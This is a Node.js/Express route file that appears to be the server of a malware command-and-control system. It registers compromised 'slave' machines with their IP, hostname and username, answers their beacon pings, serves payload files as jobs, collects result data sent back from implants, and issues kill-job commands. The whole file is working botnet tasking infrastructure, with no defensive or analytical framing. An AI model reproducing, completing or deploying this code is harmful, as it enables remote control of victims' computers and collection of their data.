/**
 * Route for /
 */

const router = express.Router();
const responseHelper = require("../../helpers/ImplantResponseHelper")
const implantMiddleware = require("../../middlewares/ImplantMiddleware")



router.post("/", implantMiddleware.checkInitRequest, (req, res) => {

    // Check if slave exists.
    console.log(req.body);
    const slaveExists = databaseHelper.getSlaveById(req.body.id);
    if (!slaveExists) {

        databaseHelper.addNewSlave({
            id: req.body.id,
            ip: req.socket.remoteAddress,
            computername: req.body.computername,
            info: req.body.info,
            username: req.body.username
        })
    }

    // Check if the new slave has an init job.
    const job = databaseHelper.getJobForSlave(req.body.id);
    if (!job) {
        res.json({code: responseHelper.LOITER});
        return;
    }
    
    // Send job details.
    res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
})

router.get("/ping/:slaveId", (req, res) => {
    
    // Check if implant has connected before.
    const slave = databaseHelper.getSlaveById(req.params.slaveId);
    if (!slave) {

        // Send not init response.
        res.json({code: responseHelper.NOT_INIT});
        return;
    }
    
    // Keep up track of active implants.
    const job = databaseHelper.getJobForSlave(req.params.slaveId);
    if (job) {
        // Send job details.
        res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
        return;
    }

    // Check if active implant has jobs running we want to kill.
    const killList = databaseHelper.getKillList(req.params.slaveId);
    if (killList.length > 0) {
        
        // Once per time.        
        databaseHelper.killJob(killList[0].jobId)
        res.json({code: responseHelper.KILL_JOB, jobId: killList[0].jobId})
        return;
    }
    
    res.json({code: responseHelper.PONG}) // No jobs at the moment.
})

router.get("/job/:jobId", (req, res) => {
        
    // Check if slave even has job.
    const job = databaseHelper.getJobWithId(req.params.jobId);
    if (!job) {

        console.log("Something unusual, slave shouldn't request for job without permission!")
        res.status(404).json({code: responseHelper.LOITER});
        return;
    }

    databaseHelper.setJobStatus(req.params.jobId, "RUNNING");
    res.download(job.location);
})

router.post("/job/:jobId", (req, res) => {

    // Check if job has a string result.
    if (req.body && req.body.data && req.body.encoding) {

        databaseHelper.setJobData(req.params.jobId, req.body.data, req.body.encoding);
    }
    
    // Mark job as done.    
    databaseHelper.setJobStatus(req.params.jobId, "FINISHED", req.body.code, true);

    res.json({code: responseHelper.LOITER})
})

router.get("/server-status", (req, res) => {

    // Kick out malware, ban IP?
    // Intrusion.
})

module.exports = router;